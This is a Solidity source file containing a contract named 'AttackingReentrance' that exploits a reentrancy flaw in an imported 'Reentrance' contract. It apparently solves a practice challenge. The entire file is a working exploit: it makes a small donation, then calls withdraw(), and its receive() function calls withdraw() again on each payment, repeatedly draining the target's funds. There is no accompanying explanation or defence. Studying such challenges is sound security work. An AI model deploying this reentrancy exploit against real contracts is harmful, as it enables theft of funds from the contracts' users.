// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance private reentrance;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentrance = Reentrance(_contractAddress);
    }

    function hackContract() external {
        address payable addr = payable(this);
        reentrance.donate{value: 1 wei}(addr);

        reentrance.withdraw();
    }

    receive() external payable {
        reentrance.withdraw();
    }
}